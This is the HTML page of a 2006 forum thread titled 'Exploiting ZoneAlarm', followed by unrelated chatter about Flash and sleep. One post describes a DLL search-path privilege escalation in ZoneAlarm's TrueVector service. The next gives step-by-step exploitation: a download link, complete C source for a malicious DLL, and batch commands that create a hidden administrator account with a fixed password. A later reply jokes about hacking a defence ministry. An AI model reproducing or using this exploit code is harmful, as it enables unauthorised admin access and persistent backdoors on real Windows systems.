@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang='en'>
+  <head>
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-PK63DK');</script>
+    <meta content='text/html; charset=UTF-8' http-equiv='Content-Type'>
+    <meta charset='utf-8'>
+    <meta content='width=device-width, initial-scale=1, shrink-to-fit=no' name='viewport'>
+    <link crossorigin='anonymous' href='https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css' integrity='sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB' rel='stylesheet'>
+    <link href='/styles.css' rel='stylesheet'>
+    <title>Exploiting ZoneAlarm</title>
+    <script async='async' src='https://www.googletagservices.com/tag/js/gpt.js'></script><script>var googletag=googletag ||{}; googletag.cmd=googletag.cmd || [];</script><script>googletag.cmd.push(function(){googletag.defineSlot('\/1010898\/sgforums_interstitial', [ 1.0 , 1.0], 'div-gpt-ad-1528181032761-0').setTargeting('forum', ['2250']).setTargeting('topic', ['182120']).addService(googletag.pubads()); googletag.defineSlot('\/1010898\/sgforums_leaderboard', [[ 728.0 , 90.0], [ 970.0 , 250.0]], 'div-gpt-ad-1528181032761-1').setTargeting('forum', ['2250']).setTargeting('topic', ['182120']).addService(googletag.pubads()); googletag.defineSlot('\/1010898\/sgforums_mpu', [ 300.0 , 250.0], 'div-gpt-ad-1528181032761-2').setTargeting('forum', ['2250']).setTargeting('topic', ['182120']).addService(googletag.pubads()); googletag.defineSlot('\/1010898\/sgforums_supersky', [ 160.0 , 600.0], 'div-gpt-ad-1528181032761-3').setTargeting('forum', ['2250']).setTargeting('topic', ['182120']).addService(googletag.pubads()); googletag.pubads().enableSingleRequest(); googletag.enableServices();});</script>
+  </head>
+  <body>
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PK63DK"height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+    <div class='container'>
+      <a href='/'>Home</a>
+      >
+      <a href='/forums/2250/'>IT Support and Tech Corner</a>
+      <h1>Exploiting ZoneAlarm</h1>
+      <nav class='pagination'>
+      </nav>
+      <ul class='list-group posts'>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>ndmmxiaomayi</div>
+              <time class='date' datetime='2006-03-13T01:32:24+00:00'>13 Mar 06, 01:32</time>
+            </div>
+            <div class='col-md body'>Details:<br>During Windows startup the TrueVector service (vsmon.exe - an integral piece of most Zone Labs products) is set to startup automatically. The TrueVector service runs under the context of the Local System account. During its startup process it attempts to load several DLLs (that are listed below).<br><br>- VSUTIL_Loc0409_Oem8701.dll<br>- VSUTIL_Oem8701.dll<br>- VSUTIL_Loc0409.dll<br>- vsmon_Loc0409_Oem8701.dll<br>- vsmon_Oem8701.dll<br>- vsmon_Loc0409.dll<br>- VSRULEDB_Loc0409_Oem8701.dll<br>- VSRULEDB_Oem8701.dll<br>- VSRULEDB_Loc0409.dll<br>- av_Loc0409_Oem8701.dll<br>- av_Oem8701.dll<br>- av_Loc0409.dll<br>- zlquarantine_Loc0409_Oem8701.dll<br>- zlquarantine_Oem8701.dll<br>- zlquarantine_Loc0409.dll<br>- zlsre_Loc0409_Oem8701.dll<br>- zlsre_Oem8701.dll<br>- zlsre_Loc0409.dll<br><br>It appears that instead of using the full path to the DLL during the load process only the name of the DLL is used. This causes several instances of Windows PATH trolling (where Windows tries to locate the DLL in the directories listed in its PATH environment variable on behalf of the vsmon.exe process). This PATH trolling is what makes the vsmon.exe process vulnerable to several privilege escalation techniques. Below is the output from a Filemon capture of the TrueVector service startup process (edited for brevity). Please note that I have ActiveState's ActivePerl installed so C:\Perl\bin is included in my PATH.<br><br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\VSUTIL_Loc0409_Oem8701.dll NOT FOUND<br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\VSUTIL_Oem8701.dll NOT FOUND<br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\VSUTIL_Loc0409.dll NOT FOUND<br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\vsmon_Loc0409_Oem8701.dll NOT FOUND<br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\vsmon_Oem8701.dll NOT FOUND<br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\vsmon_Loc0409.dll NOT FOUND<br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\VSRULEDB_Loc0409_Oem8701.dll NOT FOUND<br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\VSRULEDB_Oem8701.dll NOT FOUND<br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\VSRULEDB_Loc0409.dll NOT FOUND<br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\av_Loc0409_Oem8701.dll NOT FOUND<br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\av_Oem8701.dll NOT FOUND<br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\av_Loc0409.dll NOT FOUND<br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\zlquarantine_Loc0409_Oem8701.dll NOT FOUND<br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\zlquarantine_Oem8701.dll NOT FOUND<br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\zlquarantine_Loc0409.dll NOT FOUND<br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\zlsre_Loc0409_Oem8701.dll NOT FOUND<br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\zlsre_Oem8701.dll NOT FOUND<br>vsmon.exe QUERY INFORMATION<br>C:\Perl\bin\zlsre_Loc0409.dll NOT FOUND<br><br>Exploitation Requirements:<br>First of all, you will need to have a directory that is writeable to a lower level user, that is included in the Windows PATH environment variable.<br><br>Secondly, verify that the path you have chosen is definitely writeable to a lower level user. On Windows 2000 operating systems the default permissions for the root of the partition where the operating system is installed is set as Everyone/Full Control. So, by default, C:\Perl\bin is set to Everyone/Full Control. On Windows 2000 operating systems a guest account can be used during the exploitation process. On Windows XP, the C:\Perl\bin folder has special permissions set (by default) for the local Users group that allows the creation and modification of new files and folders. Perfect,<br>that is all that is needed. On Windows XP, an account in the local Users group can be used during the exploitation process.<br><br>Vulnerable Versions:<br>Zone Labs ZoneAlarm Security Suite build 6.1.744.000 and possibly earlier versions.<br><br>Patches/Workarounds:<br>The vendor was notified several times but there was no response. The initial notification was sent on 12.20.05. Two follow-up notifications were sent afterward. So, in the meantime, play around with your firewall.</div>
+          </div>
+        </li>
+        <li class='list-group-item'>
+          <div id='div-gpt-ad-1528181032761-2' style='height:250px; width:300px;'><script>googletag.cmd.push(function(){googletag.display('div-gpt-ad-1528181032761-2');});</script></div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>ndmmxiaomayi</div>
+              <time class='date' datetime='2006-03-13T01:33:53+00:00'>13 Mar 06, 01:33</time>
+            </div>
+            <div class='col-md body'>1. Download from <a href="http://reedarvin.thearvins.com/tools/magic.zip" rel="nofollow">http://reedarvin.thearvins.com/tools/magic.zip</a> or compile your own using the source code below.<br><br>2. Extract the magic.dll and magic.bat files.<br><br>3. Rename the magic.dll file to any of the 18 different file names listed above. In this example I will use VSUTIL_Loc0409_Oem8701.dll.<br><br>4. Copy the VSUTIL_Loc0409_Oem8701.dlll and<br>magic.bat files to your<br>chosen directory<br>listed in the Windows PATH environment<br>variable.<br><br>5. Restart the machine.<br><br>6. When the TrueVector service starts up it will<br>create a new user account named<br>Magic with a password of M@g1c$$ and add it to<br>the local<br>Administrators group.<br><br>// ===== Start Magic.c ======<br>// Build Instructions<br>//<br>// gcc -c -DBUILD_DLL magic.c<br>// gcc -shared -o magic.dll<br>-W1,--out-implib,libkernel32.a magic.o<br><br>#include <br><br>VOID RunMagicBatFile( VOID );<br><br>BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD<br>fdwReason, LPVOID lpvReserved )<br>{<br>BOOLEAN bSuccess = TRUE;<br><br>switch ( fdwReason )<br>{<br>case DLL_PROCESS_ATTACH:<br>RunMagicBatFile();<br><br>break;<br><br>case DLL_THREAD_ATTACH:<br><br>break;<br><br>case DLL_THREAD_DETACH:<br><br>break;<br><br>case DLL_PROCESS_DETACH:<br><br>break;<br>}<br><br>return bSuccess;<br>}<br><br>VOID RunMagicBatFile()<br>{<br>TCHAR szWinDir[ _MAX_PATH ];<br>TCHAR szCmdLine[ _MAX_PATH ];<br><br>STARTUPINFO si;<br>PROCESS_INFORMATION pi;<br><br>GetEnvironmentVariable( "WINDIR", szWinDir,<br>_MAX_PATH );<br><br>wsprintf( szCmdLine, "%s\\system32\\cmd.exe /c<br>magic.bat", szWinDir );<br><br>ZeroMemory( &amp;si, sizeof( si ) );<br><br>si.cb = sizeof( si );<br><br>ZeroMemory( &amp;pi, sizeof( pi ) );<br><br>CreateProcess( NULL, szCmdLine, NULL, NULL,<br>FALSE, 0, NULL, NULL, &amp;si, &amp;pi );<br><br>CloseHandle( pi.hProcess );<br>CloseHandle( pi.hThread );<br>}<br>// ===== End Magic.c ======<br><br>// ===== Start Magic.bat ======<br>net user Magic M@g1c$$ /add<br>net localgroup Administrators Magic /add<br>// ===== End Magic.bat ======</div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>MÂ©+square</div>
+              <time class='date' datetime='2006-03-13T01:34:26+00:00'>13 Mar 06, 01:34</time>
+            </div>
+            <div class='col-md body'>I quit on ZA on Nov 2005</div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>ndmmxiaomayi</div>
+              <time class='date' datetime='2006-03-13T01:36:57+00:00'>13 Mar 06, 01:36</time>
+            </div>
+            <div class='col-md body'>Think of quitting it, but since it's fun to play with it, might as well keep it.  <img src="/images/emoticons/classic/icon_lol.gif" alt="Laughing" title="Laughing"></div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>MÂ©+square</div>
+              <time class='date' datetime='2006-03-13T01:38:11+00:00'>13 Mar 06, 01:38</time>
+            </div>
+            <div class='col-md body'><blockquote><div class="quote_from">Originally posted by ndmmxiaomayi:</div><div class="quote_body">Think of quitting it, but since it's fun to play with it, might as well keep it.  <img src="/images/emoticons/classic/icon_lol.gif" alt="Laughing" title="Laughing"> </div></blockquote>waste my time leh.... <img src="/images/emoticons/classic/icon_lol.gif" alt="Laughing" title="Laughing"><br><br>I play with freehand MX  <img src="/images/emoticons/classic/icon_mrgreen.gif" alt="Mr. Green" title="Mr. Green"></div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>ndmmxiaomayi</div>
+              <time class='date' datetime='2006-03-13T01:41:20+00:00'>13 Mar 06, 01:41</time>
+            </div>
+            <div class='col-md body'><blockquote><div class="quote_from">Originally posted by MÂ©+square:</div><div class="quote_body">waste my time leh.... <img src="/images/emoticons/classic/icon_lol.gif" alt="Laughing" title="Laughing"><br><br>I play with freehand MX  <img src="/images/emoticons/classic/icon_mrgreen.gif" alt="Mr. Green" title="Mr. Green"> </div></blockquote>Haha  <img src="/images/emoticons/classic/icon_lol.gif" alt="Laughing" title="Laughing"><br><br>Wah lao... freehand eats up a lot of resources also.</div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>MÂ©+square</div>
+              <time class='date' datetime='2006-03-13T01:43:08+00:00'>13 Mar 06, 01:43</time>
+            </div>
+            <div class='col-md body'><blockquote><div class="quote_from">Originally posted by ndmmxiaomayi:</div><div class="quote_body">Haha  <img src="/images/emoticons/classic/icon_lol.gif" alt="Laughing" title="Laughing"><br><br>Wah lao... freehand eats up a lot of resources also. </div></blockquote>at least i'm doing something....ZA can learn wad.... <img src="/images/emoticons/classic/icon_exclaim.gif" alt="Exclamation" title="Exclamation">  <img src="/images/emoticons/classic/icon_question.gif" alt="Question" title="Question">  <img src="/images/emoticons/classic/icon_mrgreen.gif" alt="Mr. Green" title="Mr. Green"></div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>ndmmxiaomayi</div>
+              <time class='date' datetime='2006-03-13T01:48:26+00:00'>13 Mar 06, 01:48</time>
+            </div>
+            <div class='col-md body'><blockquote><div class="quote_from">Originally posted by MÂ©+square:</div><div class="quote_body">at least i'm doing something....ZA can learn wad.... <img src="/images/emoticons/classic/icon_exclaim.gif" alt="Exclamation" title="Exclamation">  <img src="/images/emoticons/classic/icon_question.gif" alt="Question" title="Question">  <img src="/images/emoticons/classic/icon_mrgreen.gif" alt="Mr. Green" title="Mr. Green"> </div></blockquote>I am also doing something, designing a website for fun.<br><br>Maybe will write a program to come up with random passwords.  <img src="/images/emoticons/classic/icon_mrgreen.gif" alt="Mr. Green" title="Mr. Green"></div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>MÂ©+square</div>
+              <time class='date' datetime='2006-03-13T01:58:18+00:00'>13 Mar 06, 01:58</time>
+            </div>
+            <div class='col-md body'><blockquote><div class="quote_from">Originally posted by ndmmxiaomayi:</div><div class="quote_body">I am also doing something, designing a website for fun.<br><br>Maybe will write a program to come up with random passwords.  <img src="/images/emoticons/classic/icon_mrgreen.gif" alt="Mr. Green" title="Mr. Green"> </div></blockquote>Tsk....design a website for me la....<br><br>Flash design!!!  <img src="/images/emoticons/classic/icon_mrgreen.gif" alt="Mr. Green" title="Mr. Green"></div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>ndmmxiaomayi</div>
+              <time class='date' datetime='2006-03-13T02:00:56+00:00'>13 Mar 06, 02:00</time>
+            </div>
+            <div class='col-md body'><blockquote><div class="quote_from">Originally posted by MÂ©+square:</div><div class="quote_body">Tsk....design a website for me la....<br><br>Flash design!!!  <img src="/images/emoticons/classic/icon_mrgreen.gif" alt="Mr. Green" title="Mr. Green"> </div></blockquote>Flash?<br><br>Can't seem to learn Flash. Have been playing around with it, but nothing comes out.</div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>MÂ©+square</div>
+              <time class='date' datetime='2006-03-13T02:09:54+00:00'>13 Mar 06, 02:09</time>
+            </div>
+            <div class='col-md body'><blockquote><div class="quote_from">Originally posted by ndmmxiaomayi:</div><div class="quote_body">Flash?<br><br>Can't seem to learn Flash. Have been playing around with it, but nothing comes out. </div></blockquote>wah lau.....you know script writing but no use flash....waste waste.<br></div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>ndmmxiaomayi</div>
+              <time class='date' datetime='2006-03-13T02:17:29+00:00'>13 Mar 06, 02:17</time>
+            </div>
+            <div class='col-md body'><blockquote><div class="quote_from">Originally posted by MÂ©+square:</div><div class="quote_body">wah lau.....you know script writing but no use flash....waste waste.<br></div></blockquote>A bit only lor. Some more I only playing around. Some code is I copy and paste one. Where got so smart to write all?  <img src="/images/emoticons/classic/icon_mrgreen.gif" alt="Mr. Green" title="Mr. Green"></div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>MÂ©+square</div>
+              <time class='date' datetime='2006-03-13T02:20:55+00:00'>13 Mar 06, 02:20</time>
+            </div>
+            <div class='col-md body'><blockquote><div class="quote_from">Originally posted by ndmmxiaomayi:</div><div class="quote_body">A bit only lor. Some more I only playing around. Some code is I copy and paste one. Where got so smart to write all?  <img src="/images/emoticons/classic/icon_mrgreen.gif" alt="Mr. Green" title="Mr. Green"> </div></blockquote>Why so late haben sleep?</div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>ndmmxiaomayi</div>
+              <time class='date' datetime='2006-03-13T02:23:45+00:00'>13 Mar 06, 02:23</time>
+            </div>
+            <div class='col-md body'><blockquote><div class="quote_from">Originally posted by MÂ©+square:</div><div class="quote_body">Why so late haben sleep?</div></blockquote>Sleep just now. From 6pm to 10pm.  <img src="/images/emoticons/classic/icon_mrgreen.gif" alt="Mr. Green" title="Mr. Green"></div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>chanff8</div>
+              <time class='date' datetime='2006-03-13T11:19:10+00:00'>13 Mar 06, 11:19</time>
+            </div>
+            <div class='col-md body'><blockquote><div class="quote_from">Originally posted by ndmmxiaomayi:</div><div class="quote_body">Flash?<br><br>Can't seem to learn Flash. Have been playing around with it, but nothing comes out. </div></blockquote>Try Macintosh version of Flash, called <a href="http://www.apple.com/finalcutstudio/motion/" rel="nofollow">Motion</a>. Its beautiful... <img src="/images/emoticons/classic/icon_mrgreen.gif" alt="Mr. Green" title="Mr. Green"></div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>ceecookie</div>
+              <time class='date' datetime='2006-03-13T11:31:07+00:00'>13 Mar 06, 11:31</time>
+            </div>
+            <div class='col-md body'>i still miss the old OS MS-DOS where i can write commands whether its nonsense or not...now no more in XP <img src="/images/emoticons/classic/icon_sad.gif" alt="Sad" title="Sad"></div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>MÂ©+square</div>
+              <time class='date' datetime='2006-03-13T11:33:14+00:00'>13 Mar 06, 11:33</time>
+            </div>
+            <div class='col-md body'><blockquote><div class="quote_from">Originally posted by chanff8:</div><div class="quote_body">Try Macintosh version of Flash, called <a href="http://www.apple.com/finalcutstudio/motion/" rel="nofollow">Motion</a>. Its beautiful... <img src="/images/emoticons/classic/icon_mrgreen.gif" alt="Mr. Green" title="Mr. Green"> </div></blockquote>you know how ex bohzzz.  <img src="/images/emoticons/classic/icon_mrgreen.gif" alt="Mr. Green" title="Mr. Green"><br>It's a vidz production software ain't it?<br></div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>ceecookie</div>
+              <time class='date' datetime='2006-03-13T11:48:34+00:00'>13 Mar 06, 11:48</time>
+            </div>
+            <div class='col-md body'>can u teach me to hack the Ministry of Defence's server so i can play ard and sell top secret info to other country <img src="/images/emoticons/classic/icon_lol.gif" alt="Laughing" title="Laughing">  <img src="/images/emoticons/classic/icon_lol.gif" alt="Laughing" title="Laughing"></div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>ndmmxiaomayi</div>
+              <time class='date' datetime='2006-03-13T12:05:26+00:00'>13 Mar 06, 12:05</time>
+            </div>
+            <div class='col-md body'><blockquote><div class="quote_from">Originally posted by ceecookie:</div><div class="quote_body">can u teach me to hack the Ministry of Defence's server so i can play ard and sell top secret info to other country <img src="/images/emoticons/classic/icon_lol.gif" alt="Laughing" title="Laughing">  <img src="/images/emoticons/classic/icon_lol.gif" alt="Laughing" title="Laughing"> </div></blockquote>You go Google search yourself. But high chance that they aren't using ZoneAlarm, so this exploit won't work. Need some hard work to get the info. But shouldn't be too hard to get their IP address.  <img src="/images/emoticons/classic/icon_lol.gif" alt="Laughing" title="Laughing"></div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>chanff8</div>
+              <time class='date' datetime='2006-03-13T15:31:59+00:00'>13 Mar 06, 15:31</time>
+            </div>
+            <div class='col-md body'><blockquote><div class="quote_from">Originally posted by MÂ©+square:</div><div class="quote_body">you know how ex bohzzz.  <img src="/images/emoticons/classic/icon_mrgreen.gif" alt="Mr. Green" title="Mr. Green"><br>It's a vidz production software ain't it?<br></div></blockquote>Comes in a package of 4 Pro Apps... <a href="http://www.apple.com/finalcutstudio" rel="nofollow">http://www.apple.com/finalcutstudio</a><br><br>1k+ <img src="/images/emoticons/classic/icon_lol.gif" alt="Laughing" title="Laughing"></div>
+          </div>
+        </li>
+        <li class='list-group-item post'>
+          <div class='row'>
+            <div class='col-md-2 meta'>
+              <div class='author'>ceecookie</div>
+              <time class='date' datetime='2006-03-13T15:35:48+00:00'>13 Mar 06, 15:35</time>
+            </div>
+            <div class='col-md body'><blockquote><div class="quote_from">Originally posted by ndmmxiaomayi:</div><div class="quote_body">You go Google search yourself. But high chance that they aren't using ZoneAlarm, so this exploit won't work. Need some hard work to get the info. But shouldn't be too hard to get their IP address.  <img src="/images/emoticons/classic/icon_lol.gif" alt="Laughing" title="Laughing"> </div></blockquote>with ur exp is it possible to hack the MINDEF and get data urself? <img src="/images/emoticons/classic/icon_razz.gif" alt="Razz" title="Razz"></div>
+          </div>
+        </li>
+      </ul>
+      <nav class='pagination'>
+      </nav>
+      <footer>
+        <nav class='nav'>
+          <a class='nav-link' href='/'>Home</a>
+          <a class='nav-link' href='/privacy/'>Privacy</a>
+          <a class='nav-link' href='/terms/'>Terms</a>
+        </nav>
+      </footer>
+    </div>
+    <div id='div-gpt-ad-1528181032761-0' style='height:1px; width:1px;'><script>googletag.cmd.push(function(){googletag.display('div-gpt-ad-1528181032761-0');});</script></div>
+  </body>
+</html>
